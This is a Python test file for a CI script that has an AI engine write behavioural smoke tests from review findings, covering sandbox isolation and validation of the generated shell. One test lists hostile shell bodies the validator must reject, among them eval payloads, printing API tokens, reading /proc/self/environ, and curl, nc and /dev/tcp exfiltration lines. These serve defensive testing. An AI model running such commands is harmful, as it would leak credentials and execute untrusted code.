#!/usr/bin/env python3
"""Tests for behavioural smoke synthesis from judge-interim findings."""

from __future__ import annotations

import inspect
import json
import os
import re
import subprocess
import tempfile
from pathlib import Path


REPO_ROOT = Path(__file__).resolve().parent.parent
SYNTH_SCRIPT = REPO_ROOT / "scripts" / "review_synthesise_smoke.sh"
STAGE_HELPER = REPO_ROOT / "scripts" / "stage_workflow_support.sh"
VALIDATE_DRIVER = REPO_ROOT / "scripts" / "validate_driver.sh"
VALIDATE_PROCESS = REPO_ROOT / "scripts" / "validate_process.sh"
CI_WORKFLOW = REPO_ROOT / ".github" / "workflows" / "ci.yml"
INTERNAL_VALIDATE_WORKFLOW = REPO_ROOT / ".github" / "workflows" / "internal-validate.yml"
MARK_STABLE_WORKFLOW = REPO_ROOT / ".github" / "workflows" / "mark-stable.yml"
REVIEW_AUTOFIX_WORKFLOW = REPO_ROOT / ".github" / "workflows" / "review_autofix.yml"
TEST_AND_MARK_STABLE_WORKFLOW = REPO_ROOT / ".github" / "workflows" / "test-and-mark-stable.yml"
VALIDATE_WORKFLOW = REPO_ROOT / ".github" / "workflows" / "validate.yml"


def _install_mock_codex(
	mock_bin_dir: Path,
	*,
	stdout_text: str = "",
	stderr_text: str = "",
	exit_code: int = 0,
) -> None:
	mock_bin_dir.mkdir(parents=True, exist_ok=True)
	stdout_file = mock_bin_dir / "codex_stdout.txt"
	stderr_file = mock_bin_dir / "codex_stderr.txt"
	stdout_file.write_text(stdout_text, encoding="utf-8")
	stderr_file.write_text(stderr_text, encoding="utf-8")

	(mock_bin_dir / "codex").write_text(
		"#!/usr/bin/env bash\n"
		"set -euo pipefail\n\n"
		"case \" $* \" in\n"
		"\t*\" exec \"*) ;;\n"
		"\t*) echo \"mock-codex supports only exec\" >&2; exit 2 ;;\n"
		"esac\n"
		"if [ -n \"${MOCK_CODEX_STDOUT_FILE:-}\" ] && [ -f \"${MOCK_CODEX_STDOUT_FILE}\" ]; then\n"
		"\tcat \"${MOCK_CODEX_STDOUT_FILE}\"\n"
		"fi\n"
		"if [ -n \"${MOCK_CODEX_STDERR_FILE:-}\" ] && [ -f \"${MOCK_CODEX_STDERR_FILE}\" ]; then\n"
		"\tcat \"${MOCK_CODEX_STDERR_FILE}\" >&2\n"
		"fi\n"
		f"exit \"${{MOCK_CODEX_EXIT_CODE:-{exit_code}}}\"\n",
		encoding="utf-8",
	)
	(mock_bin_dir / "codex").chmod(0o755)
	(mock_bin_dir / "opencode").write_text(
		"#!/usr/bin/env bash\n"
		"set -euo pipefail\n\n"
		"if [ \"${1:-}\" = \"--version\" ]; then printf '1.18.23\\n'; exit 0; fi\n"
		"if [ \"${1:-}\" != \"run\" ]; then echo \"mock-opencode supports only run\" >&2; exit 2; fi\n"
		"if [ -n \"${MOCK_OPENCODE_CALLED_FILE:-}\" ]; then printf 'called\\n' >> \"${MOCK_OPENCODE_CALLED_FILE}\"; fi\n"
		"cat \"${MOCK_CODEX_STDOUT_FILE}\"\n"
		"cat \"${MOCK_CODEX_STDERR_FILE}\" >&2\n"
		f"exit \"${{MOCK_CODEX_EXIT_CODE:-{exit_code}}}\"\n",
		encoding="utf-8",
	)
	(mock_bin_dir / "opencode").chmod(0o755)
	(mock_bin_dir / "write_opencode_config.sh").write_text(
		"#!/usr/bin/env bash\n"
		"set -euo pipefail\n"
		"config_path=''\n"
		"while [ $# -gt 0 ]; do\n"
		"\tif [ \"$1\" = '--config-path' ]; then config_path=\"$2\"; shift 2; else shift; fi\n"
		"done\n"
		"mkdir -p \"$(dirname \"${config_path}\")\"\n"
		"printf '{}\\n' > \"${config_path}\"\n",
		encoding="utf-8",
	)
	(mock_bin_dir / "write_opencode_config.sh").chmod(0o755)


def _install_mock_timeout(mock_bin_dir: Path) -> Path:
	mock_bin_dir.mkdir(parents=True, exist_ok=True)
	timeout_capture = mock_bin_dir / "timeout_duration.txt"
	(mock_bin_dir / "timeout").write_text(
		"#!/usr/bin/env bash\n"
		"set -euo pipefail\n\n"
		"while [ \"$#\" -gt 0 ]; do\n"
		"\tcase \"$1\" in\n"
		"\t\t--signal=*|--kill-after=*) shift ;;\n"
		"\t\t--) shift; break ;;\n"
		"\t\t*) break ;;\n"
		"\tesac\n"
		"done\n"
		"duration=\"${1:-}\"\n"
		"shift || true\n"
		"printf '%s\\n' \"$duration\" >> \"${MOCK_TIMEOUT_DURATION_FILE}\"\n"
		"exec \"$@\"\n",
		encoding="utf-8",
	)
	(mock_bin_dir / "timeout").chmod(0o755)
	return timeout_capture


def _seed_repo_with_autofix_commit(workspace: Path) -> str:
	workspace.mkdir(parents=True, exist_ok=True)
	(workspace / "src").mkdir(parents=True, exist_ok=True)
	module = workspace / "src" / "module.py"
	module.write_text("def run():\n\treturn 'seed'\n", encoding="utf-8")

	subprocess.run(["git", "init", "-q", "-b", "main"], cwd=workspace, check=True, timeout=60)
	for key, value in (
		("user.email", "test@local"),
		("user.name", "test"),
		("commit.gpgsign", "false"),
	):
		subprocess.run(["git", "config", key, value], cwd=workspace, check=True, timeout=60)
	subprocess.run(["git", "add", "src/module.py"], cwd=workspace, check=True, timeout=60)
	subprocess.run(
		["git", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "seed"],
		cwd=workspace,
		check=True,
		timeout=60,
	)

	module.write_text(
		"def run():\n\tif True:\n\t\treturn 'autofix'\n\treturn 'seed'\n",
		encoding="utf-8",
	)
	subprocess.run(["git", "add", "src/module.py"], cwd=workspace, check=True, timeout=60)
	subprocess.run(
		["git", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "[ai-autofix] adjust module"],
		cwd=workspace,
		check=True,
		timeout=60,
	)
	return subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=workspace, text=True, timeout=60).strip()


# Stub review sandbox: the synthesiser never runs OpenCode on the host, so
# the tests drive the mock `opencode` through this stand-in for
# review_untrusted_sandbox.sh.  `run` arguments: prompt, out, model, effort,
# config, engine, role, access.
STUB_REVIEW_SANDBOX = """#!/usr/bin/env bash
set -euo pipefail
case "${1:-}" in
	prepare-ephemeral)
		if [ "${MOCK_SANDBOX_PREPARE_FAIL:-0}" = "1" ]; then
			echo "stub sandbox: prepare refused" >&2
			exit 1
		fi
		printf '%s\\n' "${MOCK_SANDBOX_ROOT}"
		;;
	run)
		if [ -n "${MOCK_SANDBOX_ENGINE_FILE:-}" ]; then
			printf '%s %s %s\\n' "$7" "$8" "$9" >> "${MOCK_SANDBOX_ENGINE_FILE}"
		fi
		opencode run < /dev/null > "$3"
		;;
	cleanup)
		exit 0
		;;
	*)
		exit 2
		;;
esac
"""


def _install_stub_support_scripts(mock_bin_dir: Path) -> Path:
	"""Mirror scripts/ as symlinks, with a real stub review sandbox helper.

	The synthesiser refuses a symlinked sandbox helper, so the stub is a
	regular file; every other helper resolves to the repository copy.
	"""
	support_dir = mock_bin_dir / "support_scripts"
	support_dir.mkdir(parents=True, exist_ok=True)
	for entry in (REPO_ROOT / "scripts").iterdir():
		if entry.name == "review_untrusted_sandbox.sh":
			continue
		link = support_dir / entry.name
		if not link.exists() and not link.is_symlink():
			link.symlink_to(entry)
	sandbox = support_dir / "review_untrusted_sandbox.sh"
	sandbox.write_text(STUB_REVIEW_SANDBOX, encoding="utf-8")
	sandbox.chmod(0o755)
	(mock_bin_dir / "sandbox_root").mkdir(parents=True, exist_ok=True)
	return support_dir


def _base_env(workspace: Path, runtime_dir: Path, mock_bin_dir: Path) -> dict[str, str]:
	home_dir = workspace / "home"
	(home_dir / ".codex").mkdir(parents=True, exist_ok=True)
	(home_dir / ".codex" / "config.toml").write_text(
		'model_reasoning_effort = "low"\n',
		encoding="utf-8",
	)

	env = os.environ.copy()
	env["PYTHONDONTWRITEBYTECODE"] = "1"
	env["HOME"] = str(home_dir)
	env["PATH"] = f"{mock_bin_dir}:{env.get('PATH', '')}"
	env["SUPPORT_ROOT_DIR"] = str(REPO_ROOT)
	env["SUPPORT_SCRIPTS_DIR"] = str(_install_stub_support_scripts(mock_bin_dir))
	env["MOCK_SANDBOX_ROOT"] = str(mock_bin_dir / "sandbox_root")
	env["MOCK_SANDBOX_ENGINE_FILE"] = str(mock_bin_dir / "sandbox_engine.txt")
	env["MOCK_OPENCODE_CALLED_FILE"] = str(mock_bin_dir / "opencode_called.txt")
	env["SUPPORT_PROMPTS_DIR"] = str(REPO_ROOT / "prompts")
	env["RUNTIME_DIR"] = str(runtime_dir)
	env["PR_NUMBER"] = "4242"
	env["ROUND_NUMBER"] = "0"
	env["HEAD_SHA"] = "stale-head-sha"
	env["BEHAVIOURAL_SMOKE_LANG"] = "python"
	env["OPENCODE_CONFIG_WRITER_PATH"] = str(mock_bin_dir / "write_opencode_config.sh")
	env["OPENCODE_VERSION"] = "1.18.23"
	env["MOCK_CODEX_STDOUT_FILE"] = str(mock_bin_dir / "codex_stdout.txt")
	env["MOCK_CODEX_STDERR_FILE"] = str(mock_bin_dir / "codex_stderr.txt")
	return env


def _write_judge_artifact(workspace: Path, head_sha: str, remaining_issues: list[dict[str, object]]) -> Path:
	artifact = workspace / ".ai" / "review_runtime" / "pr-4242" / "round-1" / "judge_interim.json"
	artifact.parent.mkdir(parents=True, exist_ok=True)
	artifact.write_text(
		json.dumps(
			{
				"round": 1,
				"head_sha": head_sha,
				"remaining_issues": remaining_issues,
			},
			indent=2,
		)
		+ "\n",
		encoding="utf-8",
	)
	return artifact


def _extract_shell_function(path: Path, function_name: str) -> str:
	lines = path.read_text(encoding="utf-8").splitlines()
	start = None
	for idx, line in enumerate(lines):
		if line.startswith(f"{function_name}()"):
			start = idx
			break
	if start is None:
		raise AssertionError(f"missing function {function_name} in {path}")

	brace_line = start + 1
	while brace_line < len(lines) and lines[brace_line].strip() != "{":
		brace_line += 1
	if brace_line >= len(lines):
		raise AssertionError(f"missing opening brace for {function_name}")

	in_heredoc: str | None = None
	depth = 1
	end = brace_line + 1
	while end < len(lines):
		stripped = lines[end].strip()
		if in_heredoc is not None:
			if stripped == in_heredoc:
				in_heredoc = None
			end += 1
			continue
		match = re.search(r"<<[-]?'?([A-Za-z_][A-Za-z0-9_]*)'?", lines[end])
		if match:
			in_heredoc = match.group(1)
		if stripped == "{" or stripped.startswith("{ "):
			depth += 1
		elif stripped == "}" or stripped.startswith("}"):
			depth -= 1
			if depth == 0:
				return "\n".join(lines[start : end + 1]) + "\n"
		end += 1

	raise AssertionError(f"could not extract function {function_name}")


def _make_issue(issue_id: str, line_start: int, line_end: int, symptom: str) -> dict[str, object]:
	return {
		"id": issue_id,
		"file": "src/module.py",
		"line_start": line_start,
		"line_end": line_end,
		"symptom": symptom,
		"evidence_quote": "return 'autofix'",
		"severity": "must-fix",
	}


def test_review_synthesise_smoke_writes_manifest_and_cached_wrappers() -> None:
	with tempfile.TemporaryDirectory(prefix="review_synth_smoke_ok_") as td:
		workspace = Path(td)
		runtime_dir = workspace / "runtime"
		runtime_dir.mkdir(parents=True, exist_ok=True)
		mock_bin_dir = workspace / "mock_bin"
		head_sha = _seed_repo_with_autofix_commit(workspace)
		_write_judge_artifact(
			workspace,
			head_sha,
			[
				_make_issue("src/module.py:2:branch-check", 2, 3, "Branch still always returns autofix"),
				_make_issue("src/module.py:4:stale-value", 4, 4, "Fallback branch still uses stale value"),
			],
		)
		_install_mock_codex(
			mock_bin_dir,
			stdout_text=json.dumps(
				[
					{
						"path": "validation/tests/suggested_branch_check.sh",
						"content": "python3 - <<'PY'\nprint('still present')\nraise SystemExit(1)\nPY",
						"expected_to_fail_until_fixed": True,
					},
					{
						"path": "validation/tests/suggested_stale_value.sh",
						"content": "node - <<'NODE'\nconsole.log('cleared')\nprocess.exit(0)\nNODE",
						"expected_to_fail_until_fixed": True,
					},
				]
			)
			+ "\n",
		)
		env = _base_env(workspace, runtime_dir, mock_bin_dir)

		result = subprocess.run(
			["bash", str(SYNTH_SCRIPT)],
			cwd=workspace,
			env=env,
			capture_output=True,
			text=True,
			timeout=60,
		)

		manifest = workspace / ".ai" / "review_runtime" / "pr-4242" / "round-1" / "synth" / "synth_round_1_manifest.json"
		combined_output = result.stdout + result.stderr
		assert result.returncode == 0, combined_output
		assert manifest.exists(), combined_output
		payload = json.loads(manifest.read_text(encoding="utf-8"))
		assert payload["round"] == 1
		assert payload["head_sha"] == head_sha
		assert payload["language"] == "python"
		assert len(payload["files"]) == 2
		assert [row["slug"] for row in payload["files"]] == [
			"src_module_py_2_branch_check",
			"src_module_py_4_stale_value",
		]
		assert payload["files"][0]["target_relpath"] == "validation/tests/synth_round_1_src_module_py_2_branch_check.sh"
		assert payload["files"][1]["target_relpath"] == "validation/tests/synth_round_1_src_module_py_4_stale_value.sh"
		for row in payload["files"]:
			wrapper_path = workspace / row["cache_relpath"]
			assert wrapper_path.exists(), wrapper_path
			wrapper_text = wrapper_path.read_text(encoding="utf-8")
			assert "BEHAVIOURAL_SMOKE_PRESENT_PASSED" in wrapper_text
			assert "BEHAVIOURAL_SMOKE_PRESENT_FAILED" in wrapper_text
			assert "BEHAVIOURAL_SMOKE_PRESENT_INCONCLUSIVE" in wrapper_text
		assert "BEHAVIOURAL_SMOKE_SYNTHESISED count=2 round=1 language=python" in combined_output


def test_review_synthesise_smoke_fails_open_on_malformed_output() -> None:
	with tempfile.TemporaryDirectory(prefix="review_synth_smoke_failopen_") as td:
		workspace = Path(td)
		runtime_dir = workspace / "runtime"
		runtime_dir.mkdir(parents=True, exist_ok=True)
		mock_bin_dir = workspace / "mock_bin"
		head_sha = _seed_repo_with_autofix_commit(workspace)
		_write_judge_artifact(
			workspace,
			head_sha,
			[_make_issue("src/module.py:2:branch-check", 2, 3, "Branch still always returns autofix")],
		)
		_install_mock_codex(mock_bin_dir, stdout_text='{"action":"fix"}\n')
		env = _base_env(workspace, runtime_dir, mock_bin_dir)

		result = subprocess.run(
			["bash", str(SYNTH_SCRIPT)],
			cwd=workspace,
			env=env,
			capture_output=True,
			text=True,
			timeout=60,
		)

		manifest = workspace / ".ai" / "review_runtime" / "pr-4242" / "round-1" / "synth" / "synth_round_1_manifest.json"
		combined_output = result.stdout + result.stderr
		assert result.returncode == 0, combined_output
		assert not manifest.exists(), combined_output
		assert "BEHAVIOURAL_SMOKE_SYNTHESIS_FAIL reason=json_parse_failed round=1" in combined_output


def test_review_synthesise_smoke_surfaces_codex_stderr_on_failure() -> None:
	with tempfile.TemporaryDirectory(prefix="review_synth_smoke_stderr_") as td:
		workspace = Path(td)
		runtime_dir = workspace / "runtime"
		runtime_dir.mkdir(parents=True, exist_ok=True)
		mock_bin_dir = workspace / "mock_bin"
		head_sha = _seed_repo_with_autofix_commit(workspace)
		_write_judge_artifact(
			workspace,
			head_sha,
			[_make_issue("src/module.py:2:branch-check", 2, 3, "Branch still always returns autofix")],
		)
		_install_mock_codex(
			mock_bin_dir,
			stdout_text="",
			stderr_text="mock model lookup failed\n",
			exit_code=1,
		)
		env = _base_env(workspace, runtime_dir, mock_bin_dir)

		result = subprocess.run(
			["bash", str(SYNTH_SCRIPT)],
			cwd=workspace,
			env=env,
			capture_output=True,
			text=True,
			timeout=60,
		)

		manifest = workspace / ".ai" / "review_runtime" / "pr-4242" / "round-1" / "synth" / "synth_round_1_manifest.json"
		combined_output = result.stdout + result.stderr
		assert result.returncode == 0, combined_output
		assert not manifest.exists(), combined_output
		assert "BEHAVIOURAL_SMOKE_SYNTHESIS_FAIL reason=llm_failed round=1" in combined_output
		assert "BEHAVIOURAL_SMOKE_SYNTHESIS_STDERR_BEGIN" in result.stderr
		assert "mock model lookup failed" in result.stderr
		assert "BEHAVIOURAL_SMOKE_SYNTHESIS_STDERR_END" in result.stderr


def test_review_synthesise_smoke_codex_selection_runs_in_the_sandbox() -> None:
	with tempfile.TemporaryDirectory(prefix="review_synth_smoke_sandbox_codex_") as td:
		workspace = Path(td)
		runtime_dir = workspace / "runtime"
		runtime_dir.mkdir(parents=True, exist_ok=True)
		mock_bin_dir = workspace / "mock_bin"
		head_sha = _seed_repo_with_autofix_commit(workspace)
		_write_judge_artifact(
			workspace,
			head_sha,
			[_make_issue("src/module.py:2:branch-check", 2, 3, "Branch still always returns autofix")],
		)
		_install_mock_codex(mock_bin_dir, stdout_text='{"action":"fix"}\n')
		env = _base_env(workspace, runtime_dir, mock_bin_dir)

		result = subprocess.run(
			["bash", str(SYNTH_SCRIPT)],
			cwd=workspace,
			env=env,
			capture_output=True,
			text=True,
			timeout=60,
		)

		combined_output = result.stdout + result.stderr
		assert result.returncode == 0, combined_output
		assert (mock_bin_dir / "sandbox_engine.txt").read_text(encoding="utf-8") == "codex BEHAVIOURAL_SMOKE read\n"
		assert "REVIEW_UTILITY_ISOLATION" not in combined_output


def test_review_synthesise_smoke_refuses_host_opencode_when_sandbox_unavailable() -> None:
	# Finding review-summarizer-host-fallback (sibling): a sandbox that cannot
	# be prepared must never fall back to OpenCode on the credential-bearing host.
	with tempfile.TemporaryDirectory(prefix="review_synth_smoke_sandbox_refused_") as td:
		workspace = Path(td)
		runtime_dir = workspace / "runtime"
		runtime_dir.mkdir(parents=True, exist_ok=True)
		mock_bin_dir = workspace / "mock_bin"
		head_sha = _seed_repo_with_autofix_commit(workspace)
		_write_judge_artifact(
			workspace,
			head_sha,
			[_make_issue("src/module.py:2:branch-check", 2, 3, "Branch still always returns autofix")],
		)
		_install_mock_codex(mock_bin_dir, stdout_text='{"action":"fix"}\n')
		env = _base_env(workspace, runtime_dir, mock_bin_dir)
		env["MOCK_SANDBOX_PREPARE_FAIL"] = "1"

		result = subprocess.run(
			["bash", str(SYNTH_SCRIPT)],
			cwd=workspace,
			env=env,
			capture_output=True,
			text=True,
			timeout=60,
		)

		combined_output = result.stdout + result.stderr
		assert result.returncode == 0, combined_output
		assert not (mock_bin_dir / "opencode_called.txt").exists(), combined_output
		assert (
			"::error::REVIEW_UTILITY_ISOLATION role=BEHAVIOURAL_SMOKE engine=codex outcome=refused reason=sandbox_unavailable"
			in result.stderr
		)
		assert "BEHAVIOURAL_SMOKE_SYNTHESIS_FAIL reason=isolation_unavailable round=1" in combined_output


def test_review_synthesise_smoke_fails_open_on_wrong_item_count() -> None:
	with tempfile.TemporaryDirectory(prefix="review_synth_smoke_count_mismatch_") as td:
		workspace = Path(td)
		runtime_dir = workspace / "runtime"
		runtime_dir.mkdir(parents=True, exist_ok=True)
		mock_bin_dir = workspace / "mock_bin"
		head_sha = _seed_repo_with_autofix_commit(workspace)
		_write_judge_artifact(
			workspace,
			head_sha,
			[_make_issue("src/module.py:2:branch-check", 2, 3, "Branch still always returns autofix")],
		)
		_install_mock_codex(
			mock_bin_dir,
			stdout_text=json.dumps(
				[
					{
						"path": "validation/tests/first.sh",
						"content": "echo first\nexit 1",
						"expected_to_fail_until_fixed": True,
					},
					{
						"path": "validation/tests/second.sh",
						"content": "echo second\nexit 1",
						"expected_to_fail_until_fixed": True,
					},
				]
			)
			+ "\n",
		)
		env = _base_env(workspace, runtime_dir, mock_bin_dir)

		result = subprocess.run(
			["bash", str(SYNTH_SCRIPT)],
			cwd=workspace,
			env=env,
			capture_output=True,
			text=True,
			timeout=60,
		)

		manifest = workspace / ".ai" / "review_runtime" / "pr-4242" / "round-1" / "synth" / "synth_round_1_manifest.json"
		combined_output = result.stdout + result.stderr
		assert result.returncode == 0, combined_output
		assert not manifest.exists(), combined_output
		assert "could not validate synthesis output" in combined_output
		assert "BEHAVIOURAL_SMOKE_SYNTHESIS_FAIL reason=json_parse_failed round=1" in combined_output


def test_review_synthesise_smoke_rejects_unsafe_shell_constructs() -> None:
	with tempfile.TemporaryDirectory(prefix="review_synth_smoke_unsafe_") as td:
		workspace = Path(td)
		runtime_dir = workspace / "runtime"
		runtime_dir.mkdir(parents=True, exist_ok=True)
		mock_bin_dir = workspace / "mock_bin"
		head_sha = _seed_repo_with_autofix_commit(workspace)
		_write_judge_artifact(
			workspace,
			head_sha,
			[_make_issue("src/module.py:2:branch-check", 2, 3, "Branch still always returns autofix")],
		)
		env = _base_env(workspace, runtime_dir, mock_bin_dir)
		manifest = workspace / ".ai" / "review_runtime" / "pr-4242" / "round-1" / "synth" / "synth_round_1_manifest.json"

		for content in (
			'printf hello#;eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'AWK=eval\n$AWK "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'coproc eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'coproc\\\n eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'coproc /bin/bash -c "printf unsafe"\nbehavioural_smoke_inconclusive "unsafe"',
			'coproc env eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'coproc\\\n env eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'/bin/bash -c "printf unsafe"\nbehavioural_smoke_inconclusive "unsafe"',
			'/usr/bin/env eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'result="$(whoami)"\nbehavioural_smoke_inconclusive "unsafe"',
			'bash -c "printf unsafe"\nbehavioural_smoke_inconclusive "unsafe"',
			'eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'exec /bin/false\nbehavioural_smoke_inconclusive "unsafe"',
			'env -S "printf unsafe"\nbehavioural_smoke_inconclusive "unsafe"',
			'env --split-string="printf unsafe"\nbehavioural_smoke_inconclusive "unsafe"',
			'source ./payload.sh\nbehavioural_smoke_inconclusive "unsafe"',
			'. ./payload.sh\nbehavioural_smoke_inconclusive "unsafe"',
			'cmd & eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'cmd |& eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'> /dev/null eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'2>/dev/null eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'env eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'env -u SOME_VAR eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'sudo eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'sudo -u root eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'time eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'time -o /dev/null eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'time --format %E eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'time -p eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'time /usr/bin/env eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'! eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'timeout 1 eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'timeout 10s eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'timeout -s KILL 1 eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'xargs eval\nbehavioural_smoke_inconclusive "unsafe"',
			'xargs -d , eval\nbehavioural_smoke_inconclusive "unsafe"',
			'command -p eval "$PAYLOAD"\nbehavioural_smoke_inconclusive "unsafe"',
			'builtin -- source ./payload.sh\nbehavioural_smoke_inconclusive "unsafe"',
			'if eval "$PAYLOAD"; then behavioural_smoke_inconclusive "unsafe"; fi',
			# Finding smoke-synth-credentialed-test-exec: bodies may not name a
			# pipeline credential or start a network client.
			'printf "%s" "$GH_TOKEN"\nbehavioural_smoke_inconclusive "unsafe"',
			'printf "%s" "${OPENROUTER_API_KEY}"\nbehavioural_smoke_inconclusive "unsafe"',
			'grep ANTHROPIC_API_KEY /proc/self/environ\nbehavioural_smoke_inconclusive "unsafe"',
			'curl -d @payload https://example.invalid\nbehavioural_smoke_inconclusive "unsafe"',
			'/usr/bin/wget https://example.invalid\nbehavioural_smoke_inconclusive "unsafe"',
			'env nc example.invalid 80\nbehavioural_smoke_inconclusive "unsafe"',
			'printf x > /dev/tcp/127.0.0.1/80\nbehavioural_smoke_inconclusive "unsafe"',
		):
			_install_mock_codex(
				mock_bin_dir,
				stdout_text=json.dumps(
					[
						{
							"path": "validation/tests/unsafe.sh",
							"content": content,
							"expected_to_fail_until_fixed": True,
						}
					]
				)
				+ "\n",
			)

			result = subprocess.run(
				["bash", str(SYNTH_SCRIPT)],
				cwd=workspace,
				env=env,
				capture_output=True,
				text=True,
				timeout=60,
			)

			combined_output = result.stdout + result.stderr
			assert result.returncode == 0, f"{content}: {combined_output}"
			assert "could not validate synthesis output" in combined_output, f"{content}: {combined_output}"
			assert "BEHAVIOURAL_SMOKE_SYNTHESIS_FAIL reason=json_parse_failed round=1" in combined_output, f"{content}: {combined_output}"
			assert not manifest.exists(), f"{content}: {combined_output}"


def test_review_synthesise_smoke_invalid_lang_falls_back_to_repo_detection() -> None:
	with tempfile.TemporaryDirectory(prefix="review_synth_smoke_lang_") as td:
		workspace = Path(td)
		runtime_dir = workspace / "runtime"
		runtime_dir.mkdir(parents=True, exist_ok=True)
		mock_bin_dir = workspace / "mock_bin"
		head_sha = _seed_repo_with_autofix_commit(workspace)
		(workspace / "requirements-dev.txt").write_text("pytest==8.0.0\n", encoding="utf-8")
		_write_judge_artifact(workspace, head_sha, [])
		_install_mock_codex(mock_bin_dir, stdout_text="[]\n")
		env = _base_env(workspace, runtime_dir, mock_bin_dir)
		env["BEHAVIOURAL_SMOKE_LANG"] = " pythoon \n second-line "

		result = subprocess.run(
			["bash", str(SYNTH_SCRIPT)],
			cwd=workspace,
			env=env,
			capture_output=True,
			text=True,
			timeout=60,
		)

		manifest = workspace / ".ai" / "review_runtime" / "pr-4242" / "round-1" / "synth" / "synth_round_1_manifest.json"
		combined_output = result.stdout + result.stderr
		assert result.returncode == 0, combined_output
		payload = json.loads(manifest.read_text(encoding="utf-8"))
		assert payload["language"] == "python"
		assert "::warning::Invalid BEHAVIOURAL_SMOKE_LANG 'pythoon%0Asecond-line'; falling back to repo auto-detection." in result.stdout
		assert "Invalid BEHAVIOURAL_SMOKE_LANG" not in result.stderr
		assert "BEHAVIOURAL_SMOKE_SYNTHESISED count=0 round=1 language=python" in combined_output


def test_behavioural_smoke_emit_warning_is_best_effort_when_fd3_is_closed() -> None:
	function_text = _extract_shell_function(SYNTH_SCRIPT, "behavioural_smoke_emit_warning")
	result = subprocess.run(
		[
			"bash",
			"-c",
			"set -euo pipefail\n"
			"exec 3>&-\n"
			+ function_text
			+ "behavioural_smoke_emit_warning $'broken\\nwarning'\n"
			+ "echo after\n",
		],
		capture_output=True,
		text=True,
		timeout=60,
	)

	assert result.returncode == 0, result.stdout + result.stderr
	assert result.stdout.strip() == "after"
	assert result.stderr == ""


def test_review_synthesise_smoke_clamps_large_timeout_values() -> None:
	with tempfile.TemporaryDirectory(prefix="review_synth_smoke_timeout_") as td:
		workspace = Path(td)
		runtime_dir = workspace / "runtime"
		runtime_dir.mkdir(parents=True, exist_ok=True)
		mock_bin_dir = workspace / "mock_bin"
		head_sha = _seed_repo_with_autofix_commit(workspace)
		_write_judge_artifact(
			workspace,
			head_sha,
			[_make_issue("src/module.py:2:branch-check", 2, 3, "Branch still always returns autofix")],
		)
		_install_mock_codex(
			mock_bin_dir,
			stdout_text=json.dumps(
				[
					{
						"path": "validation/tests/suggested_branch_check.sh",
						"content": "echo still-present\nexit 1",
						"expected_to_fail_until_fixed": True,
					}
				]
			)
			+ "\n",
		)
		timeout_capture = _install_mock_timeout(mock_bin_dir)
		env = _base_env(workspace, runtime_dir, mock_bin_dir)
		env["BEHAVIOURAL_SMOKE_TIMEOUT_S"] = "99999999999999999999"
		env["MOCK_TIMEOUT_DURATION_FILE"] = str(timeout_capture)

		result = subprocess.run(
			["bash", str(SYNTH_SCRIPT)],
			cwd=workspace,
			env=env,
			capture_output=True,
			text=True,
			timeout=60,
		)

		manifest = workspace / ".ai" / "review_runtime" / "pr-4242" / "round-1" / "synth" / "synth_round_1_manifest.json"
		combined_output = result.stdout + result.stderr
		assert result.returncode == 0, combined_output
		assert manifest.exists(), combined_output
		# Sandbox prepare and run use the clamped budget; sandbox cleanup uses its own 30s bound.
		durations = timeout_capture.read_text(encoding="utf-8").split()
		assert [duration for duration in durations if duration != "30s"] == ["120", "120"], durations
		assert "BEHAVIOURAL_SMOKE_SYNTHESISED count=1 round=1 language=python" in combined_output


def test_generated_wrappers_report_pass_fail_and_inconclusive_advisory_states() -> None:
	with tempfile.TemporaryDirectory(prefix="review_synth_smoke_wrappers_") as td:
		workspace = Path(td)
		runtime_dir = workspace / "runtime"
		runtime_dir.mkdir(parents=True, exist_ok=True)
		mock_bin_dir = workspace / "mock_bin"
		head_sha = _seed_repo_with_autofix_commit(workspace)
		issues = [
			_make_issue("src/module.py:2:cleared", 2, 2, "Cleared issue"),
			_make_issue("src/module.py:3:present", 3, 3, "Present issue"),
			_make_issue("src/module.py:4:unknown", 4, 4, "Unknown issue"),
		]
		_write_judge_artifact(workspace, head_sha, issues)
		_install_mock_codex(
			mock_bin_dir,
			stdout_text=json.dumps(
				[
					{
						"path": "validation/tests/cleared.sh",
						"content": "echo cleared\nexit 0",
						"expected_to_fail_until_fixed": True,
					},
					{
						"path": "validation/tests/present.sh",
						"content": "echo still-present\nexit 1",
						"expected_to_fail_until_fixed": True,
					},
					{
						"path": "validation/tests/unknown.sh",
						"content": "echo inconclusive\nexit 2",
						"expected_to_fail_until_fixed": True,
					},
				]
			)
			+ "\n",
		)
		env = _base_env(workspace, runtime_dir, mock_bin_dir)

		result = subprocess.run(
			["bash", str(SYNTH_SCRIPT)],
			cwd=workspace,
			env=env,
			capture_output=True,
			text=True,
			timeout=60,
		)
